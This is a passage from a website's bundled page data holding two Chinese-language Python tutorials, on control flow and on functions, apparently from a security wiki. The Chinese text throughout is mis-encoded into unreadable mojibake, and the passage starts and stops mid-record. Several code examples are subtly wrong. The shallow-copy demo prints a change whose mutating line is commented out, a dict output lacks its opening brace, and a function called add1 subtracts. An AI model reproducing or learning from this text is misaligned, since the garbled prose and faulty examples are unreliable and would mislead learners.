è¿æ¥å­ç¬¦ä¸²æ¶ï¼ä¸è¦ä½¿ç¨ + ï¼ç¨joinæ¿æ¢\n 5. åè¡¨å é¤åæå¥æ¶ï¼å°½éå¨å°¾é¨æä½\n\n\n# zip()å¹¶è¡è¿­ä»£\n\næä»¬å¯ä»¥éè¿zipè¿è¡å¹¶è¡çè¿­ä»£ï¼å¦æzipä¸­æç­çåºåè¢«è¿­ä»£å®äºï¼åå¾ªç¯åæ­¢ãå ä¸ºbåè¡¨åªæä¸ä¸ªåç´ ï¼æä»¥è¿­ä»£å®æä¹åç»æã\n\na = [1,2,3,4]\nb = ['zhangsan','lisi','wangwu']\nc = ['IT','HR','Leader','Boss']\n\nfor id,name,job in zip(a,b,c):\n    print(\"{name}==={id}==={job}\".format(name=name,id=id,job=job))\n\n\"\"\"\nzhangsan===1===IT\nlisi===2===HR\nwangwu===3===Leader\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ¨å¯¼å¼åå»ºåºå\n\næ¨å¯¼å¼æ¶ä»ä¸ä¸ªæ´»å¤ä¸ªè¿­ä»£å¨åå»ºåºåçä¸ç§æ¹å¼ï¼å°å¤ä¸ªå¾ªç¯åæ¡ä»¶å¤æ­ç»åï¼é¿ååé¿ä»£ç ã\n\n# åè¡¨æ¨å¯¼å¼\n\nåè¡¨æ¨å¯¼å¼çæ ¼å¼å¦ä¸ï¼\n\n# [è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡]\n# [è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡ if æ¡ä»¶å¤æ­]\n\n\n1\n2\n\n\nä¾å¦ä¸é¢çåå®¹ï¼\n\na = [x for x in range(5)]\nprint(a) # [0, 1, 2, 3, 4]\n\na = [x-1 for x in range(5)]\nprint(a) # [-1, 0, 1, 2, 3]\n\na = [x*2 for x in range(20) if x % 4 == 0]\nprint(a) # [0, 8, 16, 24, 32]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# å­å¸æ¨å¯¼å¼\n\nå­å¸æ¨å¯¼å¼çæå­å¸å¯¹è±¡ï¼å¶æ ¼å¼å¦ä¸ï¼\n\n# {key_expression : value_expression for è¡¨è¾¾å¼ in å¯è¿­ä»£å¯¹è±¡}\n\n\n1\n\n\nååè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼ä¹å¯ä»¥å­å¨ifæ¡ä»¶åforå¾ªç¯ã\n\nä¾å¦ä¸é¢çå­å¸æ¨å¯¼å¼ä¾å­ï¼\n\na = \"helloworld,java\"\nd = {c:a.count(c) for c in a}\nprint(d) # 'h': 1, 'e': 1, 'l': 3, 'o': 2, 'w': 1, 'r': 1, 'd': 1, ',': 1, 'j': 1, 'a': 2, 'v': 1}\n\n\n1\n2\n3\n\n\n# éåæ¨å¯¼å¼\n\néåæ¨å¯¼å¼ååè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼è¯­æ³å¦ä¸ï¼\n\n{è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡}\n\n\n1\n\n\nä¾å¦ï¼\n\nx = 'zhangsan'\ny = {c for c in x}\nprint(y) # {'g', 'n', 'h', 's', 'a', 'z'}\n\n\n1\n2\n3\n\n\n# çæå¨æ¨å¯¼å¼ ï¼åç»ï¼\n\nä½¿ç¨å°æ¬å·çæ¨å¯¼å¼çæçæ¯ä¸ä¸ªè¿­ä»£å¨ãå¹¶ä¸å½ç¨å®ä¸æ¬¡ä¹åï¼å°±æ æ³è¯»åæ°æ®äºãè¦ä½¿ç¨çæå¨æ¨å¯¼å¼çæåç»ï¼åéè¦tuple(çæå¨å¯¹è±¡)ï¼å¦ä¸é¢æç¤ºï¼\n\nx = (x for x in range(20))\nprint(x) # <generator object <genexpr> at 0x7f7f280e5b60>\nprint(tuple(x)) # (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19)\n\n\n1\n2\n3\n\n\n\n# åèèµæ\n\nå°å­¦å Pythonæç¨ï¼https://www.bjsxt.com",normalizedContent:"# pythonæµç¨æ§å¶é£äºäº\n\n> è®¡ç®æºå¨æ§è¡ç¨åºè§£å³é®é¢çæ¶åï¼éå¸¸æ§è¡ç¨åºçæµç¨åä¸ºä¸ç§ï¼é¡ºåºæ§è¡ãåæ¯éæ©ãå¾ªç¯æ§è¡ãå¯¹åºäºç¨åºè®¾è®¡ä¸­çä¸ä¸ªæµç¨ï¼é¡ºåºç»æãéæ©ç»æãå¾ªç¯ç»æãæ¬ç¯æ´çäºpythonä¸­çæµç¨æ§å¶ç¸å³äºå®ã\n\n\n# éæ©ç»æ\n\néæ©ç»ææ¯éè¿å¤æ­ç»å®çæ¡ä»¶æ¯å¦æç«ï¼å³å®æç»æ§è¡åªæ¡åæ¯ãéæ©ç»æåå¯ä»¥åä¸ºååæ¯ãååæ¯åå¤åæ¯ï¼å·ä½æµç¨å¾å¦ä¸æç¤ºï¼\n\n\n\n\n# ååæ¯éæ©ç»æ\n\nååæ¯çéæ©éå¸¸æ¯ä½¿ç¨ifè¯­å¥æ¥å®ç°çï¼ifè¯­å¥çè¯­æ³æ¯ï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼:\n  è¯­å¥å\n\n\n1\n2\n\n\næ¡ä»¶è¡¨è¾¾å¼ï¼å¯ä»¥æ¯é»è¾ãç®æ°ãå³ç³»è¡¨è¾¾å¼ç­ç­ã\n\nè¯­å¥ãè¯­å¥åï¼å¯ä»¥æ¯ä¸æ¡è¯­å¥æèå¤æ¡è¯­å¥ã\n\næ¡ä»¶è¡¨è¾¾å¼ä¸ºfalseçæåµï¼falseã0ã0.0ãnoneãç©ºçåºåå¯¹è±¡ãç©ºrangeãç©ºè¿­ä»£ãåºäºä¸è¿°æåµåä¸ºtrueã\n\n\n# ååæ¯éæ©ç»æ\n\nååæ¯éæ©ç»æå¨ifçåºç¡ä¹ä¸æ·»å äºelseï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼:\n  \tè¯­å¥1\nelse:\n  \tè¯­å¥2\n\n\n1\n2\n3\n4\n\n\n\n# ä¸åè¿ç®ç¬¦\n\npythonä¸­æä¾äºä¸åè¿ç®ç¬¦ï¼åjavaä¸­çç±»ä¼¼ï¼åªæ¯æå·®å¼ï¼\n\n# æ¡ä»¶è¡¨è¾¾å¼ä¸ºççå¼ if æ¡ä»¶è¡¨è¾¾å¼ else æ¡ä»¶è¡¨è¾¾å¼ä¸ºåçå¼\n\n# å¦æ age å¤§äº 18 æ¾ç¤ºæå¹´ å¦æä¸å¤§äºåæ¾ç¤º æªæå¹´\nprint(\"æå¹´\" if age > 18 else \"æªæå¹´\")\n\n\n1\n2\n3\n4\n\n\n\n# å¤åæ¯éæ©ç»æ\n\nå¤åæ¯éæ©ç»æå¨ååæ¯çåºç¡ä¸æ·»å äºelifçå¤æ­ï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼ 1 :\n\tè¯­å¥ 1/è¯­å¥å 1 \nelif æ¡ä»¶è¡¨è¾¾å¼ 2:\n\tè¯­å¥ 2/è¯­å¥å 2 .\nelif æ¡ä»¶è¡¨è¾¾å¼ n:\n\tè¯­å¥ n/è¯­å¥å n \n[else:\n\tè¯­å¥ n+1/è¯­å¥å n+1 \n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éæ©ç»æçåµå¥å³ç³»\n\néæ©ç»ææ¯å¯ä»¥è¿è¡åµå¥çï¼ä½æ¯å¨pythonä¸­ç±äºä»£ç çå±çº§å³ç³»åä»£ç çç¼©ç´§æå³ï¼å æ­¤éè¦æ ¼å¤çæ³¨æä»£ç çç¼©è¿é®é¢ã\n\n\n# å¾ªç¯ç»æ\n\nå¾ªç¯ç»æå¯ä»¥éå¤çæ§è¡ç¹å®çä»£ç æèä»£ç çæ®µãå¾ªç¯ç»æçé»è¾æ¯ï¼å½ç¬¦åæç§æ¡ä»¶ï¼æ§è¡å¾ªç¯ä½çåå®¹ãæ¯æ¬¡æ§è¡å®ä¹åï¼åæ¬¡å¤æ­æ¯å¦æ»¡è¶³æ¡ä»¶ãpythonä¸­æwhileåforä¸¤ç§å¾ªç¯æ¹å¼ã\n\n\n# whileå¾ªç¯\n\nwhileå¾ªç¯çè¯­æ³ç»æï¼\n\nwhile æ¡ä»¶è¡¨è¾¾å¼:\n  å¾ªç¯ä½\n\n\n1\n2\n\n\n\n# forå¾ªç¯\n\nforå¾ªç¯éå¸¸ç¨äºéåå¯è¿­ä»£çå¯¹è±¡ï¼è¯­æ³æ ¼å¼å¦ä¸ï¼\n\nfor åé in å¯è¿­ä»£çå¯¹è±¡:\n  å¾ªç¯ä½\n\n\n1\n2\n\n\nå¨pythonä¸­ï¼å¯è¿­ä»£çå¯¹è±¡åæ¬ï¼\n\n * åºåï¼å­ç¬¦ä¸²ãåè¡¨ãåç»\n * å­å¸\n * è¿­ä»£å¨å¯¹è±¡ï¼iterator\n * çæå¨å½æ°ï¼generator\n * æä»¶å¯¹è±¡\n\nä¸é¢å°±æ¥æ¼ç¤ºä¸ä¸å¦ä½éåä»¥ä¸çå¯¹è±¡ï¼\n\na = \"zhangsan .hello\"\nfor i in a:\n    print(i)\n\na = dict([('name','zhangsan'),('age',12)])\nfor k in a.keys():\n    print(k)\n\n    â¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# rangeå¯¹è±¡\n\nrangeå¯¹è±¡æ¯ä¸ä¸ªè¿­ä»£å¨çå¯¹è±¡ï¼å¯ä»¥ç¨æ¥çææå®èå´çæ°å­çåºåï¼è¯­æ³æ ¼å¼ä¸ºï¼\n\nrange(start,end,step)\n\n\n1\n\n\nçæçå¼æ¯ä»startå¼å§ï¼å°end-1ï¼æ­¥é¿é»è®¤æ¯1ã\n\n\n# breakè¯­å¥\n\nbreakè¯­å¥ç¨äºç»ææ´ä¸ªå¾ªç¯ãå½æåµå¥å¾ªç¯å­å¨æ¶ï¼breakåªè½è·³åºæè¿çä¸å±å¾ªç¯ã\n\n\n# continueè¯­å¥\n\ncontinueè¯­å¥ç¨äºç»ææ¬æ¬¡å¾ªç¯ï¼å¹¶ç»§ç»­æ§è¡å¤æ­ä¸ä¸æ¬¡å¾ªç¯ï¼å¦æç¬¦åå¾ªç¯çæ¡ä»¶ï¼åä¼ç»§ç»­æ§è¡å¾ªç¯ã\n\n\n# elseè¯­å¥\n\nå¨whileåforå¾ªç¯ä¸­å¯éä¸ä¸ªelseè¯­å¥ï¼è¿ä¸ªå¨å¶ä»çè¯­è¨ä¸­æ¯è¾å°è§ï¼å¦æforãwhileè¯­å¥æ²¡æè¢«breakè¯­å¥ç»æï¼åä¼æ§è¡elseè¯­å¥ï¼å¦ååä¸æ§è¡elseè¯­å¥çåå®¹ï¼\n\n\n# å¾ªç¯çä¼å\n\n 1. å°½éåå°å¾ªç¯åçä¸å¿è¦çè®¡ç®\n 2. åµå¥å¾ªç¯ä¸­ï¼å°½éåå°åå±å¾ªç¯çè®¡ç®\n 3. å±é¨åéçæ¥è¯¢éåº¦è¾å¿«ï¼ä¼åä½¿ç¨å±é¨åé\n 4. è¿æ¥å­ç¬¦ä¸²æ¶ï¼ä¸è¦ä½¿ç¨ + ï¼ç¨joinæ¿æ¢\n 5. åè¡¨å é¤åæå¥æ¶ï¼å°½éå¨å°¾é¨æä½\n\n\n# zip()å¹¶è¡è¿­ä»£\n\næä»¬å¯ä»¥éè¿zipè¿è¡å¹¶è¡çè¿­ä»£ï¼å¦æzipä¸­æç­çåºåè¢«è¿­ä»£å®äºï¼åå¾ªç¯åæ­¢ãå ä¸ºbåè¡¨åªæä¸ä¸ªåç´ ï¼æä»¥è¿­ä»£å®æä¹åç»æã\n\na = [1,2,3,4]\nb = ['zhangsan','lisi','wangwu']\nc = ['it','hr','leader','boss']\n\nfor id,name,job in zip(a,b,c):\n    print(\"{name}==={id}==={job}\".format(name=name,id=id,job=job))\n\n\"\"\"\nzhangsan===1===it\nlisi===2===hr\nwangwu===3===leader\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ¨å¯¼å¼åå»ºåºå\n\næ¨å¯¼å¼æ¶ä»ä¸ä¸ªæ´»å¤ä¸ªè¿­ä»£å¨åå»ºåºåçä¸ç§æ¹å¼ï¼å°å¤ä¸ªå¾ªç¯åæ¡ä»¶å¤æ­ç»åï¼é¿ååé¿ä»£ç ã\n\n# åè¡¨æ¨å¯¼å¼\n\nåè¡¨æ¨å¯¼å¼çæ ¼å¼å¦ä¸ï¼\n\n# [è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡]\n# [è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡ if æ¡ä»¶å¤æ­]\n\n\n1\n2\n\n\nä¾å¦ä¸é¢çåå®¹ï¼\n\na = [x for x in range(5)]\nprint(a) # [0, 1, 2, 3, 4]\n\na = [x-1 for x in range(5)]\nprint(a) # [-1, 0, 1, 2, 3]\n\na = [x*2 for x in range(20) if x % 4 == 0]\nprint(a) # [0, 8, 16, 24, 32]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# å­å¸æ¨å¯¼å¼\n\nå­å¸æ¨å¯¼å¼çæå­å¸å¯¹è±¡ï¼å¶æ ¼å¼å¦ä¸ï¼\n\n# {key_expression : value_expression for è¡¨è¾¾å¼ in å¯è¿­ä»£å¯¹è±¡}\n\n\n1\n\n\nååè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼ä¹å¯ä»¥å­å¨ifæ¡ä»¶åforå¾ªç¯ã\n\nä¾å¦ä¸é¢çå­å¸æ¨å¯¼å¼ä¾å­ï¼\n\na = \"helloworld,java\"\nd = {c:a.count(c) for c in a}\nprint(d) # 'h': 1, 'e': 1, 'l': 3, 'o': 2, 'w': 1, 'r': 1, 'd': 1, ',': 1, 'j': 1, 'a': 2, 'v': 1}\n\n\n1\n2\n3\n\n\n# éåæ¨å¯¼å¼\n\néåæ¨å¯¼å¼ååè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼è¯­æ³å¦ä¸ï¼\n\n{è¡¨è¾¾å¼ for item in å¯è¿­ä»£çå¯¹è±¡}\n\n\n1\n\n\nä¾å¦ï¼\n\nx = 'zhangsan'\ny = {c for c in x}\nprint(y) # {'g', 'n', 'h', 's', 'a', 'z'}\n\n\n1\n2\n3\n\n\n# çæå¨æ¨å¯¼å¼ ï¼åç»ï¼\n\nä½¿ç¨å°æ¬å·çæ¨å¯¼å¼çæçæ¯ä¸ä¸ªè¿­ä»£å¨ãå¹¶ä¸å½ç¨å®ä¸æ¬¡ä¹åï¼å°±æ æ³è¯»åæ°æ®äºãè¦ä½¿ç¨çæå¨æ¨å¯¼å¼çæåç»ï¼åéè¦tuple(çæå¨å¯¹è±¡)ï¼å¦ä¸é¢æç¤ºï¼\n\nx = (x for x in range(20))\nprint(x) # <generator object <genexpr> at 0x7f7f280e5b60>\nprint(tuple(x)) # (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19)\n\n\n1\n2\n3\n\n\n\n# åèèµæ\n\nå°å­¦å pythonæç¨ï¼https://www.bjsxt.com",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonå½æ°çå°ç§å¯",frontmatter:{title:"Pythonå½æ°çå°ç§å¯",date:"2022-03-23T20:00:00.000Z",permalink:"/sec/dev/python/func",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/03.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/03.Pythonå½æ°çå°ç§å¯.md",key:"v-bca2559e",path:"/sec/dev/python/func/",headers:[{level:2,title:"å½æ°ç®ä»",slug:"å½æ°ç®ä»",normalizedTitle:"å½æ°ç®ä»",charIndex:151},{level:2,title:"å®ä¹åè°ç¨",slug:"å®ä¹åè°ç¨",normalizedTitle:"å®ä¹åè°ç¨",charIndex:518},{level:3,title:"å½æ°å½¢ååå®å",slug:"å½æ°å½¢ååå®å",normalizedTitle:"å½æ°å½¢ååå®å",charIndex:775},{level:3,title:"ææ¡£å­ç¬¦ä¸²",slug:"ææ¡£å­ç¬¦ä¸²",normalizedTitle:"ææ¡£å­ç¬¦ä¸²",charIndex:836},{level:3,title:"è¿åå¼",slug:"è¿åå¼",normalizedTitle:"è¿åå¼",charIndex:124},{level:3,title:"åéçä½ç¨å",slug:"åéçä½ç¨å",normalizedTitle:"åéçä½ç¨å",charIndex:1214},{level:3,title:"Pythonä¸­çåæ°ä¼ é",slug:"pythonä¸­çåæ°ä¼ é",normalizedTitle:"pythonä¸­çåæ°ä¼ é",charIndex:1519},{level:3,title:"æ·±æ·è´åæµæ·è´",slug:"æ·±æ·è´åæµæ·è´",normalizedTitle:"æ·±æ·è´åæµæ·è´",charIndex:2069},{level:3,title:"åæ°çå ç§ç±»å",slug:"åæ°çå ç§ç±»å",normalizedTitle:"åæ°çå ç§ç±»å",charIndex:2421},{level:3,title:"Lambdaè¡¨è¾¾å¼åå¿ååæ°",slug:"lambdaè¡¨è¾¾å¼åå¿ååæ°",normalizedTitle:"lambdaè¡¨è¾¾å¼åå¿ååæ°",charIndex:3231},{level:3,title:"evalå½æ°",slug:"evalå½æ°",normalizedTitle:"evalå½æ°",charIndex:3502},{level:3,title:"éå½",slug:"éå½",normalizedTitle:"éå½",charIndex:3758},{level:3,title:"åµå¥å½æ°",slug:"åµå¥å½æ°",normalizedTitle:"åµå¥å½æ°",charIndex:3965},{level:3,title:"nonlocalå³é®å­",slug:"nonlocalå³é®å­",normalizedTitle:"nonlocalå³é®å­",charIndex:4002},{level:3,title:"LEGBè§å",slug:"legbè§å",normalizedTitle:"legbè§å",charIndex:4288}],excerpt:'<h1 id="pythonå½æ°çå°ç§å¯"><a class="header-anchor" href="#pythonå½æ°çå°ç§å¯">#</a> Pythonå½æ°çå°ç§å¯</h1>\n<blockquote>\n<p>å½æ°æ¯ä¸ä¸ªå¸¦åå­çä»£ç åï¼éè¿åç§°å¯ä»¥å¨å¶ä»ä½ç½®è°ç¨ä»£ç åä¸­çè¯­å¥æ§è¡ï¼å¾æ¹ä¾¿çå®ç°ä»£ç çå¤ç¨ï¼å¹¶ä¸å¨ä»£ç åä¸­çä»£ç ä¿®æ¹æ¶ï¼å½æ°è°ç¨æ§è¡ä¹ä¼æ§è¡æ°çä»£ç ï¼å æ­¤å½æ°å¯¹äºç¼ç¨è¯­è¨èè¨è³å³éè¦ãå½æ°åå«å½æ°è°ç¨ãä¼ åãè¿åå¼ç­åå®¹ãæä»¬å¨è¿ä¸ç¯ä¸­ï¼ä¸ä¸æ´çåºæ¥ã</p>\n</blockquote>\n',headersStr:"å½æ°ç®ä» å®ä¹åè°ç¨ å½æ°å½¢ååå®å ææ¡£å­ç¬¦ä¸² è¿åå¼ åéçä½ç¨å Pythonä¸­çåæ°ä¼ é æ·±æ·è´åæµæ·è´ åæ°çå ç§ç±»å Lambdaè¡¨è¾¾å¼åå¿ååæ° evalå½æ° éå½ åµå¥å½æ° nonlocalå³é®å­ LEGBè§å",content:"# Pythonå½æ°çå°ç§å¯\n\n> å½æ°æ¯ä¸ä¸ªå¸¦åå­çä»£ç åï¼éè¿åç§°å¯ä»¥å¨å¶ä»ä½ç½®è°ç¨ä»£ç åä¸­çè¯­å¥æ§è¡ï¼å¾æ¹ä¾¿çå®ç°ä»£ç çå¤ç¨ï¼å¹¶ä¸å¨ä»£ç åä¸­çä»£ç ä¿®æ¹æ¶ï¼å½æ°è°ç¨æ§è¡ä¹ä¼æ§è¡æ°çä»£ç ï¼å æ­¤å½æ°å¯¹äºç¼ç¨è¯­è¨èè¨è³å³éè¦ãå½æ°åå«å½æ°è°ç¨ãä¼ åãè¿åå¼ç­åå®¹ãæä»¬å¨è¿ä¸ç¯ä¸­ï¼ä¸ä¸æ´çåºæ¥ã\n\n\n# å½æ°ç®ä»\n\nä¸ä¸ªç¨åºå¾å¾ä»£è¡¨äºå®ææç§ä»»å¡çä¸ç³»åæä½çéåï¼èå½æ°éå¸¸æ¯å®æè¿ä¸ªä»»å¡å¨é¨æ¹æ³æèæåææä¸é¡¹å·ä½ä»»å¡çåè½æ­¥éª¤çéåãå½æ°æ¯ä»£ç å¤ç¨çéå¸¸æºå¶ï¼éè¿å½æ°æå¤§æ¹ä¾¿äºä»£ç çå¤ç¨ã\n\nå¨Pythonä¸­çå½æ°åä¸ºä»¥ä¸å ç§ç±»åï¼\n\n 1. åç½®å½æ°\n    \n    ä¾å¦æä»¬ä¹é´ä½¿ç¨è¿çstr list lenç­ï¼å¯ä»¥ç´æ¥å¨ä»£ç ä¸­è°ç¨\n\n 2. æ ååºå½æ°\n    \n    æä»¬éè¿importè¯­å¥åå¥äºåºï¼ç¶åä½¿ç¨å¶ä¸­å®ä¹çå½æ°\n\n 3. ç¬¬ä¸æ¹å½æ°\n    \n    Pythonç¤¾åºæä¾äºé«è´¨éçç¬¬ä¸æ¹åºï¼å®è£è¿äºåºä¹åï¼éè¿importå¯¼å¥ï¼å°±å¯ä»¥ä½¿ç¨ç¬¬ä¸æ¹çå½æ°äº\n\n 4. ç¨æ·èªå®ä¹å½æ°\n    \n    ç¨æ·èªå®ä¹çå½æ°æ¯å¼åä¸­çä¸»ä½ï¼ä¹æ¯å®æé¡¹ç®éæ±çéè¦ç»æï¼æä»¬ä¸»è¦æ¥çå¦ä½èªå®ä¹ç¨æ·å½æ°ã\n\n\n# å®ä¹åè°ç¨\n\nPythonä¸­å®ä¹ä¸ä¸ªå½æ°çåºæ¬è¯­æ³å¦ä¸ï¼\n\ndef å½æ°åç§°(åæ°åè¡¨):\n  å½æ°ä½\n\n\n1\n2\n\n\nPythonä¸­æ§è¡å°defæ¶ï¼ä¼åå»ºä¸ä¸ªå½æ°çå¯¹è±¡ï¼å¹¶ä¸ç»å®å°å½æ°çåéåç§°ä¹ä¸ãæ¬å·åæ¯å½æ°çå½¢å¼åæ°åè¡¨ï¼å¯ä»¥æ²¡æåæ°ï¼ä½æ¯æ¬å·å¿é¡»ä¿çãå¦æå½æ°ä½ä¸­æreturnè¯­å¥ï¼åå¯ä»¥æ§è¡returnè¿åå¼ï¼å¦ææ²¡æreturnï¼é»è®¤è¿åNoneãæä»¬å¨è°ç¨å½æ°ä¹åï¼å¿é¡»è¦åå®ä¹å½æ°ãåç½®çå½æ°å¯¹è±¡ä¼èªå¨åå»ºï¼æ ååºä¸­çåç¬¬ä¸æ¹åºä¸­çå½æ°ï¼å¨importæ¶ï¼ä¹ä¼æ§è¡æ¨¡åä¸­çdefè¯­å¥ã\n\n\n# å½æ°å½¢ååå®å\n\nå½¢ååå®åå¯ä»¥ç®åçè§£ä¸ºå¨å®ä¹å½æ°æ¶åæ°åè¡¨ä¸­çåæ°ä¸ºå½¢åï¼å¨å®éè°ç¨ä¼ éç»å½æ°çåæ°ä¸ºå®åã\n\n\n# ææ¡£å­ç¬¦ä¸²\n\nå¨ç¨åºä¸­ï¼æä»¬éå¸¸ä½¿ç¨äºå·ç¼åä¸æ®µæ³¨éï¼å¨å½æ°ä¸­ï¼éå¸¸å¨å½æ°é¢å¼å§çé¨åéä¸ä¸æ®µå½æ°çå®ä¹è¯´æï¼è¿å°±æ¯ææ¡£å­ç¬¦ä¸²ä¹ç§°ä¸ºå½æ°æ³¨éï¼éå¸¸ä½¿ç¨ä¸ä¸ªåå¼å·æèåå¼å·å®ç°ãä¹åå¯ä»¥éè¿print(å½æ°å.__doc__)è¾åºææ¡£å­ç¬¦ä¸²ï¼\n\ndef hello():\n    '''this is a hello world program...'''\n    print(\"helloworld\")\n\nprint(hello.__doc__) # this is a hello world program...\n\n\n1\n2\n3\n4\n5\n\n\n\n# è¿åå¼\n\nå¦æå½æ°ä½ä¸­åå«äºreturnè¯­å¥ï¼åä¼ç»æå½æ°çæ§è¡å¹¶ä¸è¿åè¿åå¼ï¼\n\nå¦æå½æ°ä½ä¸­ä¸åå«returnè¯­å¥ï¼åé»è®¤è¿åNone\n\nå¦æéååè¿åå¤ä¸ªå¼ï¼åä½¿ç¨åºåå°å¶å­èµ·æ¥ï¼ä¸èµ·è¿å\n\n\n# åéçä½ç¨å\n\nä¸ååéçä½ç¨èå´ä¸åï¼åéçä½ç¨èå´ç§°ä¸ºåéçä½ç¨åï¼ä¸åä½ç¨ååçåååéä¸åå½±åãåéå¯ä»¥åä¸ºå¨å±åéåå±é¨åéï¼\n\n * å¨å±åé\n   * å¨å½æ°åç±»å®ä¹ä¹å¤å£°æçåéï¼ä½ç¨åæ¯å®ä¹çæ¨¡åï¼ä»å®ä¹å¼å§å°æ´ä¸ªæ¨¡åçç»æ\n   * å¨å±åééä½å½æ°çéç¨æ§åå¯è¯»æ§ï¼é¿åä½¿ç¨å¨å±åé\n   * å¨å±åéä¸è¬ä½ä¸ºå¸¸éä½¿ç¨ï¼å½æ°åå¦æéè¦æ¹åå¨å±åéçå¼ï¼åéè¦globalå£°æ\n * å±é¨åé\n   * å±é¨åéæ¯å¨å½æ°ä½ä¸­å£°æçåé\n   * å±é¨åéçå¼ç¨è¦æ¯å¨å±åéå¿«ï¼å æ­¤ä¼åä½¿ç¨å±é¨åé\n   * å±é¨åéåå¨å±åéååï¼åä¼åshiyong ååçå±é¨åéï¼å°±è¿ååã\n\n\n# Pythonä¸­çåæ°ä¼ é\n\nå½æ°çåæ°ä¼ éæ¬è´¨ä¸å°±æ¯å°å®éåæ°çå¼èµå¼ç»å½¢åçè¿ç¨ãå¨Pythonä¸­ï¼ä¸åçæ¯å¯¹è±¡ï¼ææçèµå¼æä½é½æ¯å¼ç¨å¤å¶ãå æ­¤Pythonä¸­çææåæ°ä¼ éé½æ¯å¼ç¨ä¼ éèä¸æ¯å¼ä¼ éãå æ­¤å¯¹äºå¯åå¯¹è±¡çåæä½ä¼ç´æ¥ä½ç¨ååæ¥çå¯¹è±¡ï¼å¯¹ä¸å¯åå¯¹è±¡çåæä½ï¼ä¼äº§çä¸ä¸ªæ°çå¯¹è±¡ï¼å¹¶å¡«åæ°çå¼ï¼æ¯ä¸ç§åçå¼ä¼ éã\n\nå¯åçå¯¹è±¡æï¼å­å¸ãåè¡¨ãéåãèªå®ä¹çå¯¹è±¡ç­\n\nä¸å¯åçå¯¹è±¡ï¼æ°å­ãå­ç¬¦ä¸²ãåç»ãæ¹æ³ç­ã\n\nå¨ä¼ éå¯åå¯¹è±¡æ¶ï¼å¦ä¼ éçæ¯ä¸ä¸ªåè¡¨ï¼åå¦æå¨å½æ°ä¸­ä¿®æ¹äºå½¢åçå¼ï¼å®éä¸å®åçå¼ä¹ä¼æ¹åãå¦æä¼ éçæ¯ä¸å¯åçå¯¹è±¡ï¼å ä¸ºåæ°çå¼ä¸å¯åï¼åä¼å¤å¶ä¸ä»½åºæ¥ï¼éæ°åå»ºä¸ä¸ªå¯¹è±¡ï¼å°±åå¶ä»è¯­è¨ä¸­çå¼ä¼ éä¸æ ·ã\n\nä¾å­ï¼\n\ndef add1(n):\n    n -= 1\n\ndef add2(n):\n    n[0] -= 1\n\na = 1\nadd1(a)\nprint(a) # 1\n\na = list()\na.append(1)\nadd2(a)\nprint(a[0]) # 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nå¦ææä¸ªæ¹æ³ä¼ éçæ¯ä¸ä¸ªä¸å¯åå¯¹è±¡ä½ä¸ºåæ°ï¼ä½æ¯åæ°ä¸­åå«äºä¸ä¸ªå¯åå¯¹è±¡ï¼åå½æ°åä¿®æ¹å¯åå¯¹è±¡ä¹ä¼å½±åå½æ°å¤çåæ°çå¼ã\n\n\n# æ·±æ·è´åæµæ·è´\n\næ·±æ·è´ä¼åæ¬èªå¯¹è±¡ä¸èµ·æ·è´ï¼å¯¹å­å¯¹è±¡çä¿®æ¹ä¸ä¼å½±ååæ¥çå¯¹è±¡\n\næµæ·è´ä¸ä¼æ·è´èªå¯¹è±¡çåå®¹ï¼åªæ¯æ·è´äºå­å¯¹è±¡çå¼ç¨ã\n\nå¨Pythonä¸­ä½¿ç¨copyå®ææµæ·è´ï¼ä½¿ç¨deepcopyå®ææ·±æ·è´\n\na = [1,2,3,[4,5,6]]\n\nb = copy.copy(a)\n# b[3][0] = 1\nprint(b) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [1, 5, 6]]\n\nc = copy.deepcopy(a)\nc[3][0] = 1\nprint(c) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [4, 5, 6]] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# åæ°çå ç§ç±»å\n\n# ä½ç½®åæ°\n\nå½æ°è°ç¨æ¶ï¼å®éåæ°é»è®¤æç§ä½ç½®é¡ºåºä¼ éï¼å æ­¤éè¦ä¼ éçå½¢åä¸ªæ°åå®éçåæ°å¹éãæä½ç½®ä¼ éåæ°ç§°ä¸ºï¼ä½ç½®åæ°ã\n\n# é»è®¤å¼åæ°\n\nå¨å£°æå½æ°æ¶ï¼å¯ä»¥ä¸ºåæ°è®¾ç½®é»è®¤å¼ï¼è¿æ ·è¿ä¸ªåæ°å°±æ¯å¯éçäºï¼å æ­¤å¨æ²¡æä¼ 